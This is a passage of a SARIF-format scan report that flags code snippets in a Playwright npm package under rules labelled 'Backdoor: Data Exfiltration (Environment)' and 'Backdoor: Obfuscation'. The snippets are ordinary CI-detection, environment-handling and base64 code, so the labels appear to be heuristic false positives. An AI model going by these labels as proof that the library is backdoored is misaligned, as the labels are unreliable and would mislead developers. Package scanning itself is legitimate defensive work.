                      "markdown": "`\"function\"?(ge=Symbol.for(\"graceful-fs.queue\"),ts=Symbol.for(\"graceful-fs.previous\")):(ge=\"___graceful-fs.queue\",ts=\"___graceful-fs.previous\");function hm(){}function yl(e,t){Object.defineProperty(e,ge,{get:function(){return t}})}var Pt=hm;Zn.debuglog?Pt=Zn.debuglog(\"gfs4\"):/\\bgfs4\\b/i.test(process.env.NODE_DEBUG||\"\")&&(Pt=function(){var e=Zn.format.apply(Zn,arguments);e=\"GFS4: \"+e.split(/\\n/).join(`\nGFS4: `),console.error(e)});re[ge]||(gl=global[ge]||[],yl(re,gl),re.close=function(e){function t(r,n){return e.call(re,r,function(s){s||ml(),typeof n==\"function\"&&n.apply(this,arguments)})}return Object.defineProperty(t,ts,{v`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 5129,
                  "endLine": 45,
                  "endColumn": 5173,
                  "snippet": {
                    "text": "unction(n){return!!le[n]}):$e.isPR=el(e.pr);break;default:$e.isPR=null}});$e.isCI=!!(le.CI!==\"false\"&&(le.BUILD_ID||le.BUILD_NUMBER||le.CI||le.CI_APP_ID||le.CI_BUILD_ID||le.CI_BUILD_NUMBER||le.CI_NAME||le.CONTINUOUS_INTEGRATION||le.RUN_ID||$e.name));function el(e){return typeof e==\"string\"?!!le[e]:\"env\"in e?le[e.env]&&le[e.env].includes(e.includes):\"any\"in e?e.any.some(function(t){return!!le[t]}):Object.keys(e).every(function(t){return le[t]===e[t]})}});var Ii=R(Xn=>{\"use strict\";Object.defineProperty(Xn,\"__esModule\",{value:!0});Xn.default=void 0;function nl(){let e=rl();return nl=function(){return e},e}var Qg=!!process.stdout.isTTY&&pr",
                    "rendered": {
                      "text": "unction(n){return!!le[n]}):$e.isPR=el(e.pr);break;default:$e.isPR=null}});$e.isCI=!!(le.CI!==\"false\"&&(le.BUILD_ID||le.BUILD_NUMBER||le.CI||le.CI_APP_ID||le.CI_BUILD_ID||le.CI_BUILD_NUMBER||le.CI_NAME||le.CONTINUOUS_INTEGRATION||le.RUN_ID||$e.name));function el(e){return typeof e==\"string\"?!!le[e]:\"env\"in e?le[e.env]&&le[e.env].includes(e.includes):\"any\"in e?e.any.some(function(t){return!!le[t]}):Object.keys(e).every(function(t){return le[t]===e[t]})}});var Ii=R(Xn=>{\"use strict\";Object.defineProperty(Xn,\"__esModule\",{value:!0});Xn.default=void 0;function nl(){let e=rl();return nl=function(){return e},e}var Qg=!!process.stdout.isTTY&&pr",
                      "markdown": "`unction(n){return!!le[n]}):$e.isPR=el(e.pr);break;default:$e.isPR=null}});$e.isCI=!!(le.CI!==\"false\"&&(le.BUILD_ID||le.BUILD_NUMBER||le.CI||le.CI_APP_ID||le.CI_BUILD_ID||le.CI_BUILD_NUMBER||le.CI_NAME||le.CONTINUOUS_INTEGRATION||le.RUN_ID||$e.name));function el(e){return typeof e==\"string\"?!!le[e]:\"env\"in e?le[e.env]&&le[e.env].includes(e.includes):\"any\"in e?e.any.some(function(t){return!!le[t]}):Object.keys(e).every(function(t){return le[t]===e[t]})}});var Ii=R(Xn=>{\"use strict\";Object.defineProperty(Xn,\"__esModule\",{value:!0});Xn.default=void 0;function nl(){let e=rl();return nl=function(){return e},e}var Qg=!!process.stdout.isTTY&&pr`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 4778,
                  "endLine": 45,
                  "endColumn": 4832,
                  "snippet": {
                    "text": "turn e.constant})});$e.name=null;$e.isPR=null;tl.forEach(function(e){let r=(Array.isArray(e.env)?e.env:[e.env]).every(function(n){return el(n)});if($e[e.constant]=r,!!r)switch($e.name=e.name,typeof e.pr){case\"string\":$e.isPR=!!le[e.pr];break;case\"object\":\"env\"in e.pr?$e.isPR=e.pr.env in le&&le[e.pr.env]!==e.pr.ne:\"any\"in e.pr?$e.isPR=e.pr.any.some(function(n){return!!le[n]}):$e.isPR=el(e.pr);break;default:$e.isPR=null}});$e.isCI=!!(le.CI!==\"false\"&&(le.BUILD_ID||le.BUILD_NUMBER||le.CI||le.CI_APP_ID||le.CI_BUILD_ID||le.CI_BUILD_NUMBER||le.CI_NAME||le.CONTINUOUS_INTEGRATION||le.RUN_ID||$e.name));function el(e){return typeof e==\"string\"?!!le[e]:\"env",
                    "rendered": {
                      "text": "turn e.constant})});$e.name=null;$e.isPR=null;tl.forEach(function(e){let r=(Array.isArray(e.env)?e.env:[e.env]).every(function(n){return el(n)});if($e[e.constant]=r,!!r)switch($e.name=e.name,typeof e.pr){case\"string\":$e.isPR=!!le[e.pr];break;case\"object\":\"env\"in e.pr?$e.isPR=e.pr.env in le&&le[e.pr.env]!==e.pr.ne:\"any\"in e.pr?$e.isPR=e.pr.any.some(function(n){return!!le[n]}):$e.isPR=el(e.pr);break;default:$e.isPR=null}});$e.isCI=!!(le.CI!==\"false\"&&(le.BUILD_ID||le.BUILD_NUMBER||le.CI||le.CI_APP_ID||le.CI_BUILD_ID||le.CI_BUILD_NUMBER||le.CI_NAME||le.CONTINUOUS_INTEGRATION||le.RUN_ID||$e.name));function el(e){return typeof e==\"string\"?!!le[e]:\"env",
                      "markdown": "`turn e.constant})});$e.name=null;$e.isPR=null;tl.forEach(function(e){let r=(Array.isArray(e.env)?e.env:[e.env]).every(function(n){return el(n)});if($e[e.constant]=r,!!r)switch($e.name=e.name,typeof e.pr){case\"string\":$e.isPR=!!le[e.pr];break;case\"object\":\"env\"in e.pr?$e.isPR=e.pr.env in le&&le[e.pr.env]!==e.pr.ne:\"any\"in e.pr?$e.isPR=e.pr.any.some(function(n){return!!le[n]}):$e.isPR=el(e.pr);break;default:$e.isPR=null}});$e.isCI=!!(le.CI!==\"false\"&&(le.BUILD_ID||le.BUILD_NUMBER||le.CI||le.CI_APP_ID||le.CI_BUILD_ID||le.CI_BUILD_NUMBER||le.CI_NAME||le.CONTINUOUS_INTEGRATION||le.RUN_ID||$e.name));function el(e){return typeof e==\"string\"?!!le[e]:\"env`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 4570,
                  "endLine": 45,
                  "endColumn": 4600,
                  "snippet": {
                    "text": "\",pr:\"CI_PULL_REQUEST_NUMBER\"},{name:\"Xcode Server\",constant:\"XCODE_SERVER\",env:\"XCS\"}]});var rl=R($e=>{\"use strict\";var tl=Zc(),le=process.env;Object.defineProperty($e,\"_vendors\",{value:tl.map(function(e){return e.constant})});$e.name=null;$e.isPR=null;tl.forEach(function(e){let r=(Array.isArray(e.env)?e.env:[e.env]).every(function(n){return el(n)});if($e[e.constant]=r,!!r)switch($e.name=e.name,typeof e.pr){case\"string\":$e.isPR=!!le[e.pr];break;case\"object\":\"env\"in e.pr?$e.isPR=e.pr.env in le&&le[e.pr.env]!==e.pr.ne:\"any\"in e.pr?$e.isPR=e.pr.any.some(function(n){return!!le[n]}):$e.isPR=el(e.pr);break;default:$e.isPR=null}",
                    "rendered": {
                      "text": "\",pr:\"CI_PULL_REQUEST_NUMBER\"},{name:\"Xcode Server\",constant:\"XCODE_SERVER\",env:\"XCS\"}]});var rl=R($e=>{\"use strict\";var tl=Zc(),le=process.env;Object.defineProperty($e,\"_vendors\",{value:tl.map(function(e){return e.constant})});$e.name=null;$e.isPR=null;tl.forEach(function(e){let r=(Array.isArray(e.env)?e.env:[e.env]).every(function(n){return el(n)});if($e[e.constant]=r,!!r)switch($e.name=e.name,typeof e.pr){case\"string\":$e.isPR=!!le[e.pr];break;case\"object\":\"env\"in e.pr?$e.isPR=e.pr.env in le&&le[e.pr.env]!==e.pr.ne:\"any\"in e.pr?$e.isPR=e.pr.any.some(function(n){return!!le[n]}):$e.isPR=el(e.pr);break;default:$e.isPR=null}",
                      "markdown": "`\",pr:\"CI_PULL_REQUEST_NUMBER\"},{name:\"Xcode Server\",constant:\"XCODE_SERVER\",env:\"XCS\"}]});var rl=R($e=>{\"use strict\";var tl=Zc(),le=process.env;Object.defineProperty($e,\"_vendors\",{value:tl.map(function(e){return e.constant})});$e.name=null;$e.isPR=null;tl.forEach(function(e){let r=(Array.isArray(e.env)?e.env:[e.env]).every(function(n){return el(n)});if($e[e.constant]=r,!!r)switch($e.name=e.name,typeof e.pr){case\"string\":$e.isPR=!!le[e.pr];break;case\"object\":\"env\"in e.pr?$e.isPR=e.pr.env in le&&le[e.pr.env]!==e.pr.ne:\"any\"in e.pr?$e.isPR=e.pr.any.some(function(n){return!!le[n]}):$e.isPR=el(e.pr);break;default:$e.isPR=null}`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 2542,
                  "endLine": 45,
                  "endColumn": 2561,
                  "snippet": {
                    "text": "\"GitLab CI\",constant:\"GITLAB\",env:\"GITLAB_CI\",pr:\"CI_MERGE_REQUEST_ID\"},{name:\"GoCD\",constant:\"GOCD\",env:\"GO_PIPELINE_LABEL\"},{name:\"Google Cloud Build\",constant:\"GOOGLE_CLOUD_BUILD\",env:\"BUILDER_OUTPUT\"},{name:\"Harness CI\",constant:\"HARNESS\",env:\"HARNESS_BUILD_ID\"},{name:\"Heroku\",constant:\"HEROKU\",env:{env:\"NODE\",includes:\"/app/.heroku/node/bin/node\"}},{name:\"Hudson\",constant:\"HUDSON\",env:\"HUDSON_URL\"},{name:\"Jenkins\",constant:\"JENKINS\",env:[\"JENKINS_URL\",\"BUILD_ID\"],pr:{any:[\"ghprbPullId\",\"CHANGE_ID\"]}},{name:\"LayerCI\",constant:\"LAYERCI\",env:\"LAYERCI\",pr:\"LAYERCI_PULL_REQUEST\"},{name:\"Magnum CI\",constant:\"MAGN",
                    "rendered": {
                      "text": "\"GitLab CI\",constant:\"GITLAB\",env:\"GITLAB_CI\",pr:\"CI_MERGE_REQUEST_ID\"},{name:\"GoCD\",constant:\"GOCD\",env:\"GO_PIPELINE_LABEL\"},{name:\"Google Cloud Build\",constant:\"GOOGLE_CLOUD_BUILD\",env:\"BUILDER_OUTPUT\"},{name:\"Harness CI\",constant:\"HARNESS\",env:\"HARNESS_BUILD_ID\"},{name:\"Heroku\",constant:\"HEROKU\",env:{env:\"NODE\",includes:\"/app/.heroku/node/bin/node\"}},{name:\"Hudson\",constant:\"HUDSON\",env:\"HUDSON_URL\"},{name:\"Jenkins\",constant:\"JENKINS\",env:[\"JENKINS_URL\",\"BUILD_ID\"],pr:{any:[\"ghprbPullId\",\"CHANGE_ID\"]}},{name:\"LayerCI\",constant:\"LAYERCI\",env:\"LAYERCI\",pr:\"LAYERCI_PULL_REQUEST\"},{name:\"Magnum CI\",constant:\"MAGN",
                      "markdown": "`\"GitLab CI\",constant:\"GITLAB\",env:\"GITLAB_CI\",pr:\"CI_MERGE_REQUEST_ID\"},{name:\"GoCD\",constant:\"GOCD\",env:\"GO_PIPELINE_LABEL\"},{name:\"Google Cloud Build\",constant:\"GOOGLE_CLOUD_BUILD\",env:\"BUILDER_OUTPUT\"},{name:\"Harness CI\",constant:\"HARNESS\",env:\"HARNESS_BUILD_ID\"},{name:\"Heroku\",constant:\"HEROKU\",env:{env:\"NODE\",includes:\"/app/.heroku/node/bin/node\"}},{name:\"Hudson\",constant:\"HUDSON\",env:\"HUDSON_URL\"},{name:\"Jenkins\",constant:\"JENKINS\",env:[\"JENKINS_URL\",\"BUILD_ID\"],pr:{any:[\"ghprbPullId\",\"CHANGE_ID\"]}},{name:\"LayerCI\",constant:\"LAYERCI\",env:\"LAYERCI\",pr:\"LAYERCI_PULL_REQUEST\"},{name:\"Magnum CI\",constant:\"MAGN`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 976,
                  "endLine": 45,
                  "endColumn": 1003,
                  "snippet": {
                    "text": ");var Zc=R((qv,Xg)=>{Xg.exports=[{name:\"Appcircle\",constant:\"APPCIRCLE\",env:\"AC_APPCIRCLE\"},{name:\"AppVeyor\",constant:\"APPVEYOR\",env:\"APPVEYOR\",pr:\"APPVEYOR_PULL_REQUEST_NUMBER\"},{name:\"AWS CodeBuild\",constant:\"CODEBUILD\",env:\"CODEBUILD_BUILD_ARN\"},{name:\"Azure Pipelines\",constant:\"AZURE_PIPELINES\",env:\"SYSTEM_TEAMFOUNDATIONCOLLECTIONURI\",pr:\"SYSTEM_PULLREQUEST_PULLREQUESTID\"},{name:\"Bamboo\",constant:\"BAMBOO\",env:\"bamboo_planKey\"},{name:\"Bitbucket Pipelines\",constant:\"BITBUCKET\",env:\"BITBUCKET_COMMIT\",pr:\"BITBUCKET_PR_ID\"},{name:\"Bitrise\",constant:\"BITRISE\",env:\"BITRISE_IO\",pr:\"BITRISE_PULL_REQUEST\"},{name:\"Buddy\",const",
                    "rendered": {
                      "text": ");var Zc=R((qv,Xg)=>{Xg.exports=[{name:\"Appcircle\",constant:\"APPCIRCLE\",env:\"AC_APPCIRCLE\"},{name:\"AppVeyor\",constant:\"APPVEYOR\",env:\"APPVEYOR\",pr:\"APPVEYOR_PULL_REQUEST_NUMBER\"},{name:\"AWS CodeBuild\",constant:\"CODEBUILD\",env:\"CODEBUILD_BUILD_ARN\"},{name:\"Azure Pipelines\",constant:\"AZURE_PIPELINES\",env:\"SYSTEM_TEAMFOUNDATIONCOLLECTIONURI\",pr:\"SYSTEM_PULLREQUEST_PULLREQUESTID\"},{name:\"Bamboo\",constant:\"BAMBOO\",env:\"bamboo_planKey\"},{name:\"Bitbucket Pipelines\",constant:\"BITBUCKET\",env:\"BITBUCKET_COMMIT\",pr:\"BITBUCKET_PR_ID\"},{name:\"Bitrise\",constant:\"BITRISE\",env:\"BITRISE_IO\",pr:\"BITRISE_PULL_REQUEST\"},{name:\"Buddy\",const",
                      "markdown": "`);var Zc=R((qv,Xg)=>{Xg.exports=[{name:\"Appcircle\",constant:\"APPCIRCLE\",env:\"AC_APPCIRCLE\"},{name:\"AppVeyor\",constant:\"APPVEYOR\",env:\"APPVEYOR\",pr:\"APPVEYOR_PULL_REQUEST_NUMBER\"},{name:\"AWS CodeBuild\",constant:\"CODEBUILD\",env:\"CODEBUILD_BUILD_ARN\"},{name:\"Azure Pipelines\",constant:\"AZURE_PIPELINES\",env:\"SYSTEM_TEAMFOUNDATIONCOLLECTIONURI\",pr:\"SYSTEM_PULLREQUEST_PULLREQUESTID\"},{name:\"Bamboo\",constant:\"BAMBOO\",env:\"bamboo_planKey\"},{name:\"Bitbucket Pipelines\",constant:\"BITBUCKET\",env:\"BITBUCKET_COMMIT\",pr:\"BITBUCKET_PR_ID\"},{name:\"Bitrise\",constant:\"BITRISE\",env:\"BITRISE_IO\",pr:\"BITRISE_PULL_REQUEST\"},{name:\"Buddy\",const`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/expectBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 5619,
                  "endLine": 7,
                  "endColumn": 5652,
                  "snippet": {
                    "text": "urn typeof e==\"string\"||typeof e==\"function\"||e===Tn||e===Mn||e===wn||e===Ln||e===xn||e===e1||typeof e==\"object\"&&e!==null&&(e.$$typeof===Dn||e.$$typeof===Pn||e.$$typeof===$n||e.$$typeof===In||e.$$typeof===Nn||e.$$typeof===wa||e.getModuleId!==void 0)};V.typeOf=De});var $a=R(z=>{\"use strict\";process.env.NODE_ENV!==\"production\"&&function(){\"use strict\";var e=Symbol.for(\"react.element\"),t=Symbol.for(\"react.portal\"),r=Symbol.for(\"react.fragment\"),n=Symbol.for(\"react.strict_mode\"),s=Symbol.for(\"react.profiler\"),i=Symbol.for(\"react.provider\"),u=Symbol.for(\"react.context\"),o=Symbol.for(\"react.server_context\"),a=Symbol.for(\"react.for",
                    "rendered": {
                      "text": "urn typeof e==\"string\"||typeof e==\"function\"||e===Tn||e===Mn||e===wn||e===Ln||e===xn||e===e1||typeof e==\"object\"&&e!==null&&(e.$$typeof===Dn||e.$$typeof===Pn||e.$$typeof===$n||e.$$typeof===In||e.$$typeof===Nn||e.$$typeof===wa||e.getModuleId!==void 0)};V.typeOf=De});var $a=R(z=>{\"use strict\";process.env.NODE_ENV!==\"production\"&&function(){\"use strict\";var e=Symbol.for(\"react.element\"),t=Symbol.for(\"react.portal\"),r=Symbol.for(\"react.fragment\"),n=Symbol.for(\"react.strict_mode\"),s=Symbol.for(\"react.profiler\"),i=Symbol.for(\"react.provider\"),u=Symbol.for(\"react.context\"),o=Symbol.for(\"react.server_context\"),a=Symbol.for(\"react.for",
                      "markdown": "`urn typeof e==\"string\"||typeof e==\"function\"||e===Tn||e===Mn||e===wn||e===Ln||e===xn||e===e1||typeof e==\"object\"&&e!==null&&(e.$$typeof===Dn||e.$$typeof===Pn||e.$$typeof===$n||e.$$typeof===In||e.$$typeof===Nn||e.$$typeof===wa||e.getModuleId!==void 0)};V.typeOf=De});var $a=R(z=>{\"use strict\";process.env.NODE_ENV!==\"production\"&&function(){\"use strict\";var e=Symbol.for(\"react.element\"),t=Symbol.for(\"react.portal\"),r=Symbol.for(\"react.fragment\"),n=Symbol.for(\"react.strict_mode\"),s=Symbol.for(\"react.profiler\"),i=Symbol.for(\"react.provider\"),u=Symbol.for(\"react.context\"),o=Symbol.for(\"react.server_context\"),a=Symbol.for(\"react.for`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/ipc.js"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 41,
                  "endLine": 40,
                  "endColumn": 47,
                  "snippet": {
                    "text": "}\nfunction stdioChunkToParams(chunk) {\n  if (chunk instanceof Uint8Array) return {\n    buffer: Buffer.from(chunk).toString('base64')\n  };\n  if (typeof chunk !== 'string') return {\n    text: _util.default.inspect(chunk)\n",
                    "rendered": {
                      "text": "}\nfunction stdioChunkToParams(chunk) {\n  if (chunk instanceof Uint8Array) return {\n    buffer: Buffer.from(chunk).toString('base64')\n  };\n  if (typeof chunk !== 'string') return {\n    text: _util.default.inspect(chunk)\n",
                      "markdown": "`}\nfunction stdioChunkToParams(chunk) {\n  if (chunk instanceof Uint8Array) return {\n    buffer: Buffer.from(chunk).toString('base64')\n  };\n  if (typeof chunk !== 'string') return {\n    text: _util.default.inspect(chunk)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/process.js"
                },
                "region": {
                  "startLine": 116,
                  "startColumn": 28,
                  "endLine": 116,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    }\n  }\n});\nconst kForceExitTimeout = +(process.env.PWTEST_FORCE_EXIT_TIMEOUT || 30000);\nasync function gracefullyCloseAndExit(forceExit) {\n  if (forceExit && !forceExitInitiated) {\n    forceExitInitiated = true;\n",
                    "rendered": {
                      "text": "    }\n  }\n});\nconst kForceExitTimeout = +(process.env.PWTEST_FORCE_EXIT_TIMEOUT || 30000);\nasync function gracefullyCloseAndExit(forceExit) {\n  if (forceExit && !forceExitInitiated) {\n    forceExitInitiated = true;\n",
                      "markdown": "`    }\n  }\n});\nconst kForceExitTimeout = +(process.env.PWTEST_FORCE_EXIT_TIMEOUT || 30000);\nasync function gracefullyCloseAndExit(forceExit) {\n  if (forceExit && !forceExitInitiated) {\n    forceExitInitiated = true;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/process.js"
                },
                "region": {
                  "startLine": 79,
                  "startColumn": 39,
                  "endLine": 79,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    const keys = new Set([...Object.keys(process.env), ...Object.keys(startingEnv)]);\n    const producedEnv = [...keys].filter(key => startingEnv[key] !== process.env[key]).map(key => {\n      var _process$env$key;\n      return [key, (_process$env$key = process.env[key]) !== null && _process$env$key !== void 0 ? _process$env$key : null];\n    });\n    sendMessageToParent({\n      method: '__env_produced__',\n",
                    "rendered": {
                      "text": "    const keys = new Set([...Object.keys(process.env), ...Object.keys(startingEnv)]);\n    const producedEnv = [...keys].filter(key => startingEnv[key] !== process.env[key]).map(key => {\n      var _process$env$key;\n      return [key, (_process$env$key = process.env[key]) !== null && _process$env$key !== void 0 ? _process$env$key : null];\n    });\n    sendMessageToParent({\n      method: '__env_produced__',\n",
                      "markdown": "`    const keys = new Set([...Object.keys(process.env), ...Object.keys(startingEnv)]);\n    const producedEnv = [...keys].filter(key => startingEnv[key] !== process.env[key]).map(key => {\n      var _process$env$key;\n      return [key, (_process$env$key = process.env[key]) !== null && _process$env$key !== void 0 ? _process$env$key : null];\n    });\n    sendMessageToParent({\n      method: '__env_produced__',\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/process.js"
                },
                "region": {
                  "startLine": 77,
                  "startColumn": 69,
                  "endLine": 77,
                  "endColumn": 80,
                  "snippet": {
                    "text": "  }\n  if (message.method === '__stop__') {\n    const keys = new Set([...Object.keys(process.env), ...Object.keys(startingEnv)]);\n    const producedEnv = [...keys].filter(key => startingEnv[key] !== process.env[key]).map(key => {\n      var _process$env$key;\n      return [key, (_process$env$key = process.env[key]) !== null && _process$env$key !== void 0 ? _process$env$key : null];\n    });\n",
                    "rendered": {
                      "text": "  }\n  if (message.method === '__stop__') {\n    const keys = new Set([...Object.keys(process.env), ...Object.keys(startingEnv)]);\n    const producedEnv = [...keys].filter(key => startingEnv[key] !== process.env[key]).map(key => {\n      var _process$env$key;\n      return [key, (_process$env$key = process.env[key]) !== null && _process$env$key !== void 0 ? _process$env$key : null];\n    });\n",
                      "markdown": "`  }\n  if (message.method === '__stop__') {\n    const keys = new Set([...Object.keys(process.env), ...Object.keys(startingEnv)]);\n    const producedEnv = [...keys].filter(key => startingEnv[key] !== process.env[key]).map(key => {\n      var _process$env$key;\n      return [key, (_process$env$key = process.env[key]) !== null && _process$env$key !== void 0 ? _process$env$key : null];\n    });\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/process.js"
                },
                "region": {
                  "startLine": 76,
                  "startColumn": 41,
                  "endLine": 76,
                  "endColumn": 52,
                  "snippet": {
                    "text": "    return;\n  }\n  if (message.method === '__stop__') {\n    const keys = new Set([...Object.keys(process.env), ...Object.keys(startingEnv)]);\n    const producedEnv = [...keys].filter(key => startingEnv[key] !== process.env[key]).map(key => {\n      var _process$env$key;\n      return [key, (_process$env$key = process.env[key]) !== null && _process$env$key !== void 0 ? _process$env$key : null];\n",
                    "rendered": {
                      "text": "    return;\n  }\n  if (message.method === '__stop__') {\n    const keys = new Set([...Object.keys(process.env), ...Object.keys(startingEnv)]);\n    const producedEnv = [...keys].filter(key => startingEnv[key] !== process.env[key]).map(key => {\n      var _process$env$key;\n      return [key, (_process$env$key = process.env[key]) !== null && _process$env$key !== void 0 ? _process$env$key : null];\n",
                      "markdown": "`    return;\n  }\n  if (message.method === '__stop__') {\n    const keys = new Set([...Object.keys(process.env), ...Object.keys(startingEnv)]);\n    const producedEnv = [...keys].filter(key => startingEnv[key] !== process.env[key]).map(key => {\n      var _process$env$key;\n      return [key, (_process$env$key = process.env[key]) !== null && _process$env$key !== void 0 ? _process$env$key : null];\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/process.js"
                },
                "region": {
                  "startLine": 58,
                  "startColumn": 5,
                  "endLine": 58,
                  "endColumn": 16,
                  "snippet": {
                    "text": "let processRunner;\nlet processName;\nconst startingEnv = {\n  ...process.env\n};\nprocess.on('message', async message => {\n  if (message.method === '__init__') {\n",
                    "rendered": {
                      "text": "let processRunner;\nlet processName;\nconst startingEnv = {\n  ...process.env\n};\nprocess.on('message', async message => {\n  if (message.method === '__init__') {\n",
                      "markdown": "`let processRunner;\nlet processName;\nconst startingEnv = {\n  ...process.env\n};\nprocess.on('message', async message => {\n  if (message.method === '__init__') {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/process.js"
                },
                "region": {
                  "startLine": 54,
                  "startColumn": 4,
                  "endLine": 54,
                  "endColumn": 15,
                  "snippet": {
                    "text": "process.execArgv = (0, _esmUtils.execArgvWithoutExperimentalLoaderOptions)();\n\n// Node.js >= 20\nif (process.env.PW_TS_ESM_LOADER_ON) (0, _esmLoaderHost.registerESMLoader)();\nlet processRunner;\nlet processName;\nconst startingEnv = {\n",
                    "rendered": {
                      "text": "process.execArgv = (0, _esmUtils.execArgvWithoutExperimentalLoaderOptions)();\n\n// Node.js >= 20\nif (process.env.PW_TS_ESM_LOADER_ON) (0, _esmLoaderHost.registerESMLoader)();\nlet processRunner;\nlet processName;\nconst startingEnv = {\n",
                      "markdown": "`process.execArgv = (0, _esmUtils.execArgvWithoutExperimentalLoaderOptions)();\n\n// Node.js >= 20\nif (process.env.PW_TS_ESM_LOADER_ON) (0, _esmLoaderHost.registerESMLoader)();\nlet processRunner;\nlet processName;\nconst startingEnv = {\n`"
                    }
                  },
